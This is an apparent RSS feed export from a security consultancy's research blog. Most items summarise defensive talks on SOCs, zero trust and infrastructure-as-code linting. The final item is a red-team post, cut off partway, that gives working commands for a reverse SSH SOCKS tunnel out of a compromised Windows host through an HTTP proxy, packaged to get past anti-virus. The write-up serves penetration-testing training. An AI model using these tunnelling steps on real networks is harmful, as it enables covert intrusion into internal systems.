<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs</title>
	<atom:link href="https://portcullislabs.github.io/feed/" rel="self" type="application/rss+xml" />
	<link>https://portcullislabs.github.io</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>Security Engineering &#8211; A manifesto for defensive security</title>
		<link>https://portcullislabs.github.io/presentations/security-engineering-a-manifesto-for-defensive-security/</link>
		<comments>https://portcullislabs.github.io/presentations/security-engineering-a-manifesto-for-defensive-security/#comments</comments>
		<pubDate>Fri, 28 Jun 2019 06:27:47 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[C-Suite]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[CRQ]]></category>
		<category><![CDATA[cyber risk quantification]]></category>
		<category><![CDATA[devops]]></category>
		<category><![CDATA[devsecops]]></category>
		<category><![CDATA[hardening]]></category>
		<category><![CDATA[infradev]]></category>
		<category><![CDATA[orchestration]]></category>
		<category><![CDATA[risk]]></category>
		<category><![CDATA[seceng]]></category>
		<category><![CDATA[service providers]]></category>
		<category><![CDATA[SnoopCon]]></category>
		<category><![CDATA[sre]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6858</guid>
		<description><![CDATA[<p>Presentation on the need to re-examine how we engineer systems (taking service providers as an example) and the implications on how we quantify cyber risk if we want to take this message into the board room (as given at BT&#8217;s SnoopCon 2019 and Cisco&#8217;s June 2019 Knowledge Network webinar for service providers). Having delivered security [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/security-engineering-a-manifesto-for-defensive-security/">Security Engineering &#8211; A manifesto for defensive security</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on the need to re-examine how we engineer systems (taking service providers as an example) and the implications on how we quantify cyber risk if we want to take this message into the board room (as given at BT&#8217;s SnoopCon 2019 and Cisco&#8217;s June 2019 <a title="Knowledge Network" href="https://engage2demand.cisco.com/CiscoKnowledgeNetwork">Knowledge Network</a> webinar for service providers).<span id="more-6858"></span></p>
<p>Having delivered security consultancy as part of Portcullis/Cisco for over 15 years, I&#8217;ve seen a variety of shades of broken. Since I recently spent some time on secondment to one of our customers to help them design, build and operationalise security as part of their digital transformation programme, I got to thinking: what would I do if I wanted to get projects delivered right? With apologies to grsec, Jericho Forum, BeyondCorp and Trusted Computing, what followed was part philosophy, part technical brain dump, the result being my take on security engineering and how to build defensible systems. This talk includes the following hits:</p>
<ul>
<li>Helping the blue team – a case study in 3 parts&#8230;</li>
<li>Blue doesn&#8217;t have the man power to adopt gift wrapped improvements let alone offensive research thrown over the wall</li>
<li>Static passwords – why the hell are we still using them?</li>
<li>Vulnerability management – didn’t we say blacklists were bad?</li>
<li>Forget about penetration testing – what are your controls?</li>
<li>Is there another way to report – why don’t businesses listen to us?</li>
<li>Monetising MITRE – can we make money out of CVEs?</li>
</ul>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/SEAMFDS.pdf" target="_blank" title="Download SEAMFDS"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="SEAMFDS" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/SEAMFDS.pdf" title="Download SEAMFDS.pdf" target="_blank" id="wpfb-file-link-1">SEAMFDS.pdf</a>
    
    <br />
    June 28, 2019<br />
    
  </div>
  <div class="info">
    311.8 KiB<br />
    MD5 hash: 185701fbc113ca2a676e802b61df53e2 <br />
    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>June 28, 2019</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/security-engineering-a-manifesto-for-defensive-security/">Security Engineering &#8211; A manifesto for defensive security</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/security-engineering-a-manifesto-for-defensive-security/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>So you want to build a SOC: Lessons from the front line</title>
		<link>https://portcullislabs.github.io/presentations/so-you-want-to-build-a-soc-lessons-from-the-front-line/</link>
		<comments>https://portcullislabs.github.io/presentations/so-you-want-to-build-a-soc-lessons-from-the-front-line/#comments</comments>
		<pubDate>Thu, 20 Jun 2019 14:06:57 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[SOC]]></category>
		<category><![CDATA[TTRS]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6855</guid>
		<description><![CDATA[<p>Presentation on building an effective operational security capability (as given at Cisco Live US/Talos Threat Research Summit 2019). This talk will not help you build a SOC in only 60 minutes, but it will help you build a functional security operation over time. Building a SOC can be daunting. This talk will look at how [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/so-you-want-to-build-a-soc-lessons-from-the-front-line/">So you want to build a SOC: Lessons from the front line</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on building an effective operational security capability (as given at Cisco Live US/Talos Threat Research Summit 2019).<span id="more-6855"></span></p>
<p>This talk will not help you build a SOC in only 60 minutes, but it will help you build a functional security operation over time.</p>
<p>Building a SOC can be daunting. This talk will look at how to pick your fights and the key battles (authentication, logging, etc.) that any operational security team needs to win. The session will discuss how to ensure you formalize existing good practices and just as importantly what gaps may exist in the team’s processes. The session will look at the next steps that any organization intending to set off down this road ought to consider.</p>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-2').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/TTRS19SYWTBASLFTFL.pdf" target="_blank" title="Download TTRS19SYWTBASLFTFL"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="TTRS19SYWTBASLFTFL" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/TTRS19SYWTBASLFTFL.pdf" title="Download TTRS19SYWTBASLFTFL.pdf" target="_blank" id="wpfb-file-link-2">TTRS19SYWTBASLFTFL.pdf</a>
    
    <br />
    June 20, 2019<br />
    
  </div>
  <div class="info">
    1.6 MiB<br />
    MD5 hash: 9fd544a63fcac10688d82d4cec24df44 <br />
    <a href="#" onclick="return wpfilebase_filedetails(2);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails2" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>June 20, 2019</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/so-you-want-to-build-a-soc-lessons-from-the-front-line/">So you want to build a SOC: Lessons from the front line</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/so-you-want-to-build-a-soc-lessons-from-the-front-line/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Is that really you? The importance of identity in breach response and recovery</title>
		<link>https://portcullislabs.github.io/presentations/is-that-really-you-the-importance-of-identity-in-breach-response-and-recovery/</link>
		<comments>https://portcullislabs.github.io/presentations/is-that-really-you-the-importance-of-identity-in-breach-response-and-recovery/#comments</comments>
		<pubDate>Tue, 18 Jun 2019 08:56:23 +0000</pubDate>
		<dc:creator><![CDATA[RID]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[C-Suite]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[incident response]]></category>
		<category><![CDATA[InfoSec Europe]]></category>
		<category><![CDATA[zero trust]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6848</guid>
		<description><![CDATA[<p>Presentation on Zero Trust and the importance of identity in breach response and recovery (as given at InfoSec Europe 2019 on the tech talk track). Richard Dean, Cisco&#8217;s EMEAR Head Of Security Advisory Services looks at Cisco&#8217;s approach to zero trust. This talk discusses the need to monitoring your users’ access and privileges and how [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/is-that-really-you-the-importance-of-identity-in-breach-response-and-recovery/">Is that really you? The importance of identity in breach response and recovery</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on Zero Trust and the importance of identity in breach response and recovery (as given at InfoSec Europe 2019 on the tech talk track).<span id="more-6848"></span></p>
<p><a title="Richard Dean" href="https://www.infosecurityeurope.com/en/Contributors/7884596/Richard-Dean">Richard Dean</a>, Cisco&#8217;s EMEAR Head Of Security Advisory Services looks at Cisco&#8217;s approach to zero trust. </p>
<p>This talk discusses the need to monitoring your users’ access and privileges and how securing them as they interact with the Internet is core to a Zero Trust approach to cybersecurity. Richard doesn&#8217;t just stop there though but rather moves on to look at what happens if you’re facing a deliberate attempt to steal your users’ identities in order to take advantage of these privileges? In this talk, you’ll learn how to manage identity effectively, as well as the importance of software defined networks in the drive to zero trust and rapid threat containment.</p>
<p>Learning outcomes:</p>
<ol>
<li>Learn how to manage identity and access management effectively</li>
<li>The importance of software defined networks in enabling rapid threat containment</li>
<li>The first steps an organisation should take to start on the Zero Trust journey</li>
<li>Aligning corporate and personal security practices to get better adoption from staff, identify and password management</li>
<li>The importance of Software defined networks in the drive to Zero Trust</li>
</ol>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-3').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/I2019ITRYTIOIIBRR.pdf" target="_blank" title="Download I2019ITRYTIOIIBR&amp;R"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="I2019ITRYTIOIIBR&amp;R" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/I2019ITRYTIOIIBRR.pdf" title="Download I2019ITRYTIOIIBRR.pdf" target="_blank" id="wpfb-file-link-3">I2019ITRYTIOIIBRR.pdf</a>
    
    <br />
    June 18, 2019<br />
    
  </div>
  <div class="info">
    1.6 MiB<br />
    MD5 hash: 14981f12020f7774971ef61b8229188a <br />
    <a href="#" onclick="return wpfilebase_filedetails(3);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails3" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>June 18, 2019</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/is-that-really-you-the-importance-of-identity-in-breach-response-and-recovery/">Is that really you? The importance of identity in breach response and recovery</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/is-that-really-you-the-importance-of-identity-in-breach-response-and-recovery/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Discover the secrets of the SOC</title>
		<link>https://portcullislabs.github.io/presentations/discover-the-secrets-of-the-soc/</link>
		<comments>https://portcullislabs.github.io/presentations/discover-the-secrets-of-the-soc/#comments</comments>
		<pubDate>Tue, 18 Jun 2019 08:39:26 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[C-Suite]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[InfoSec Europe]]></category>
		<category><![CDATA[SOC]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6846</guid>
		<description><![CDATA[<p>Presentation on building effective SOCs (as given at InfoSec Europe 2019 on the interactive workshop track). Simon Crocker, Cisco&#8217;s EMEAR lead for SOC Advisory looks at what goes into making a SOC work effectively. This talk discusses the core SOC requirements around monitoring and incident response function, but also touches on some of the other [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/discover-the-secrets-of-the-soc/">Discover the secrets of the SOC</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on building effective SOCs (as given at InfoSec Europe 2019 on the interactive workshop track).<span id="more-6846"></span></p>
<p><a title="Simon Crocker" href="https://www.infosecurityeurope.com/en/Contributors/7928410/Simon-Crocker">Simon Crocker</a>, Cisco&#8217;s EMEAR lead for SOC Advisory looks at what goes into making a SOC work effectively. </p>
<p>This talk discusses the core SOC requirements around monitoring and incident response function, but also touches on some of the other services that SOCs can also provide.</p>
<p>Learning outcomes:</p>
<ol>
<li>The challenges that SOCs face and approaches to overcome them</li>
<li>The array of services that SOCs provide</li>
<li>The roadmap to build a SOC</li>
<li>Learn how to threat hunt proactively to root out hidden threats</li>
<li>Discover best practice on threat hunting from the largest non government threat intelligence team</li>
</ol>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-4').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/I2019DTSOTC.pdf" target="_blank" title="Download I2019DTSOTC"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="I2019DTSOTC" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/I2019DTSOTC.pdf" title="Download I2019DTSOTC.pdf" target="_blank" id="wpfb-file-link-4">I2019DTSOTC.pdf</a>
    
    <br />
    June 18, 2019<br />
    
  </div>
  <div class="info">
    925.6 KiB<br />
    MD5 hash: 904adc3b1b54f73227ad53807bac5004 <br />
    <a href="#" onclick="return wpfilebase_filedetails(4);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails4" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>June 18, 2019</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/discover-the-secrets-of-the-soc/">Discover the secrets of the SOC</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/discover-the-secrets-of-the-soc/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</title>
		<link>https://portcullislabs.github.io/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/</link>
		<comments>https://portcullislabs.github.io/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/#comments</comments>
		<pubDate>Sat, 26 Jan 2019 22:06:06 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[auditing]]></category>
		<category><![CDATA[devops]]></category>
		<category><![CDATA[devsecops]]></category>
		<category><![CDATA[infradev]]></category>
		<category><![CDATA[orchestration]]></category>
		<category><![CDATA[seceng]]></category>
		<category><![CDATA[secops]]></category>
		<category><![CDATA[sre]]></category>
		<category><![CDATA[training]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6839</guid>
		<description><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the Center for Internet Security&#8216;s Docker benchmark and CoreOS&#8216;s Clair, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the <a title="Center for Internet Security" href="https://www.cisecurity.org/">Center for Internet Security</a>&#8216;s <a title="Docker benchmark" href="https://www.cisecurity.org/benchmark/docker/">Docker benchmark</a> and <a title="CoreOS" href="https://github.com/coreos/">CoreOS</a>&#8216;s <a title="Clair" href="https://github.com/coreos/clair">Clair</a>, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing code reviews and if we&#8217;re performing code reviews then perhaps we can perform a subset of these checks automatically pre-commit?<span id="more-6839"></span></p>
<p>Many of the current generation of infrastructure orchestration tools utilise Domain Specific Languages presented through the medium of YAML, JSON etc which allow the infradev team to specify programmatically, the architecture and nature of the infrastructure they manage. Just how secure are these language and where might we find gaps that an offensive party might seek to exploit? In practice, what I was really thinking was, if I want to review commits (automatically), then what exactly do I want my tools to look for and why? This seems like an obvious question but at that point, I hadn&#8217;t seen a huge amount of talk (or more importantly, based on the work I do, evidence) on how others were doing this to review their templates before they&#8217;d been built and deployed&#8230;.</p>
<p>The good news is that somewhere along the way, whilst I was still asking around and before I started to work on this series of posts, I discovered <a title="cfn_nag" href="https://github.com/stelligent/cfn_nag">cfn_nag</a> which looked like a great start, albeit only if you&#8217;re working on <a title="AWS" href="https://aws.amazon.com/">AWS</a>&#8216;s <a title="CloudFormation" href="https://aws.amazon.com/cloudformation/">CloudFormation</a> platform. Taking inspiration from this discovery, my next search was for a linting tool for Ansible (my preferred choice for infrastructure orchestration) and this too yielded results, namely <a title="ansible-lint" href="https://github.com/ansible/ansible-lint">ansible-lint</a>. It turns out that there is more going on than I&#8217;d originally feared but that if you want to do this kind of thing (and you should), you really want to be looking for linting tools for your preferred templating language. One observation I&#8217;ll make however is that many of these linters don&#8217;t appear to have a regular stream of updates and that they may only support a limited set of checks.</p>
<p>In the next part of my thought experiment, we’ll take a deeper dive and I&#8217;ll start to consider just how effective these linters are, looking at both the theory of static analysis and code review as it applies to secure development more generally and just as importantly, looking at the assurance these tools can give you.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</title>
		<link>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
		<comments>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
		<pubDate>Fri, 25 Jan 2019 11:36:11 +0000</pubDate>
		<dc:creator><![CDATA[MRL]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[RDP]]></category>
		<category><![CDATA[red team]]></category>
		<category><![CDATA[Windows]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6813</guid>
		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
<p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
<p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
<ul>
<li>Having a foothold (command execution) on a <em>Windows </em>system in an internal network; but</li>
<li>being unable to deploy my normal C2 software (<a title="Cobalt Strike" href="https://www.cobaltstrike.com/">Cobalt Strike</a> / <a title="Meterpreter" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a>) due to Anti-Virus / Endpoint Protection.</li>
</ul>
<p>My practice had shown that I was able to deploy my C2 software of choice onto only 4 out 5 test systems. So this seemed like something I needed to prepare for. Just in case.</p>
<p>In parallel with this, I&#8217;d found that performance of SOCKS over a reverse HTTPS connection was barely adequate for tunneling an RDP connection. So I was interested in finding a solution that was:</p>
<ul>
<li>Faster</li>
<li>Worked through a proxy; and</li>
<li>Worked in the presence of my nemesis AV product</li>
</ul>
<p>My instinct was to try to SSH out of the network and use the SOCKS proxy built into SSH.  There were a few problems with this approach:</p>
<ol>
<li>I needed an SSH client &#8211; which I could solve by using <a title="Putty" href="https://www.putty.org/">Putty</a> (read on for the reason I didn&#8217;t use plink)</li>
<li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
<li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
</ol>
<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
<a href="#imageclose-6814" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-6814">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
                   </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
<h2>Solving (3): SOCKS server</h2>
<p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
<p>Eventually I stumbled on a <a title="SOCKS5 implementation written in golang" href="https://github.com/armon/go-socks5">SOCKS5 implementation written in golang</a> written by <a title="Armon Dagar" href="https://github.com/armon">Armon Dagar</a>. I&#8217;d heard that golang malware would be on the rise in 2019, so this was a good opportunity for me to waste valuable revision time on a side-interest. I&#8217;d never even compiled a golan program before. If this wasn&#8217;t too hard, it would be a nice cross-platform solution for my needs.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ mkdir -p ~/go/src
$ cd !$
$ git clone https://github.com/armon/go-socks5
$ mv go-socks5 socks5
$ cd socks5
$ go build
</pre>
<p>No errors <img src="https://portcullislabs.github.io/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://portcullislabs.github.io/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
<p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
mkdir -p ~/go/src/mysocks5
cd !$
$ cat &lt;&lt; EOF &gt; mysocks.go
// Create a SOCKS5 server
package main
import &quot;socks5&quot;

func main() {
  conf := &amp;socks5.Config{}
  server, err := socks5.New(conf)
  if err != nil {
    panic(err)
  }

  // Create SOCKS5 proxy on localhost port 1080
  if err := server.ListenAndServe(&quot;tcp&quot;, &quot;127.0.0.1:1080&quot;); err != nil {
    panic(err)
  }
}
EOF
go build
</pre>
<p>Done! I now had a &#8220;mysocks5&#8243; executable. And it worked. Repeating similar steps on Windows gave me a working mysocks5.exe. I was starting to like golang at this point.</p>
<h2>Solving (1): Putty configuration</h2>
<p>After getting almost to the finish line with the following plink command, I couldn&#8217;t specify an HTTP proxy from the command line:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a tunnnel@192.168.0.1
</pre>
<p>A quick overview of options here:</p>
<ul>
<li>-N: &#8211; I don&#8217;t need a shell, just an SSH connection for port forwarding</li>
<li>-P 443 &#8211; Target port 443, not 22 since the proxy is likely to restrict us in this way</li>
<li>-i puttykey.priv.ppk &#8211; The private key to access my listening SSH server, I needed logon to be non-interactive, obviously</li>
<li>-R 2080:127.0.0.1:1080 &#8211; Open a listening port (2080) on the SSH server and forward connections to that port to 127.0.0.1:1080 on the SSH client</li>
<li>-hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a &#8211; We don&#8217;t want any warnings or questions about unverified host keys</li>
<li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
</ul>
<p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
<a href="#imageclose-6815" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-6815">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
                   </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
<p>I saved a putty session called myproxy, then retried plink:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
plink -load myproxy
</pre>
<p>It crashed. Hence, why I&#8217;m not using plink.  Putty works fine, though:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
putty -load myproxy
</pre>
<p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
<a href="#imageclose-6816" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-6816">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
                   </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
<p>On the server-side, we see a network listener on port 2080.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
tcp 0 0 0.0.0.0:2080 0.0.0.0:* LISTEN
</pre>
<p>I wanted the service bound to 0.0.0.0 for my environment, but consider that anyone with network access could abuse your SOCKS proxy.</p>
<p>This provides a relatively high-performance SOCKS server &#8211; much better than those laggy SOCKS-over-reverse-HTTPS connections. Implants typically poll periodically over HTTPS, which means that traffic can only be sent when the implant calls home. The above method is more akin to SOCKS-over-reverse-TCP. Data can be sent in either direction immediately without waiting for a check-in. Arguably, the above method will create a more suspicious traffic pattern and some application-layer aware proxies won&#8217;t allow it (though tunneling over SSL could help).</p>
<h2>Packaging it up</h2>
<p>To deliver above attack, we need to package up the software and configuration so it can be run from the command line. We&#8217;ll assume that we can upload and unpack zip files for this part (or the post will get too long). I included the following in myproxy.zip:</p>
<ul>
<li>putty.exe</li>
<li>mysocks5.exe</li>
<li>myproxy.reg &#8211; Created by doing &#8220;reg export HKCU\Software\SimonTatham myproxy.reg&#8221;, then removing unnecessary configuration data in a text editor</li>
<li>puttykey.priv.ppk &#8211; Created using puttygen, be sure to copy the openssh-format public key into ~tunnel/.ssh/authorized_key on the SSH server too</li>
<li>mysocks.bat &#8211; See below</li>
</ul>
<p>To deploy, we need to run mysocks.bat, which does the following:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
reg import myproxy.reg
start mysocks5
putty -load myproxy
</pre>
<p>All finished. We can pivot through our fast SOCKS proxy. For example, to access RDP on the internal network, I&#8217;d do something like:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat /etc/proxychains.conf
...
socks5  127.0.0.1 2080
